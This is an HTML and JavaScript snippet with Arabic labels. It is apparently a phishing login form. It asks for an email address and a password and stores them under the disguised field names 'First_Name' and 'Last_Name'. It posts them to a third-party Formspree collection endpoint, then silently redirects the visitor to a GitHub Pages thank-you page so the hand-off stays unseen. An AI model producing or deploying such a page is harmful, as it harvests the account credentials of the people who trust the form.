<form id="my-form" action="https://formspree.io/f/xgozqzbw" method="POST">
    <label>البريد الإلكتروني:</label>
    <input type="text" name="First_Name" required>
    
    <label>كلمة السر:</label>
    <input type="text" name="Last_Name" required>

    <button type="submit" id="submit-btn">تسجيل</button>
</form>

<script>
    var form = document.getElementById("my-form");
    
    async function handleSubmit(event) {
      event.preventDefault(); // يمنع ظهور صفحة Formspree البيضاء
      var data = new FormData(event.target);
      
      fetch(event.target.action, {
        method: form.method,
        body: data,
        headers: {
            'Accept': 'application/json'
        }
      }).then(response => {
        if (response.ok) {
          // التوجيه الإجباري لصفحة الشكر الخاصة بك
          window.location.href = "https://alymaanythlkm.github.io/999/thanks.html";
        } else {
          alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
        }
      }).catch(error => {
        alert("تأكد من اتصالك بالإنترنت.");
      });
    }
    form.addEventListener("submit", handleSubmit)
</script>
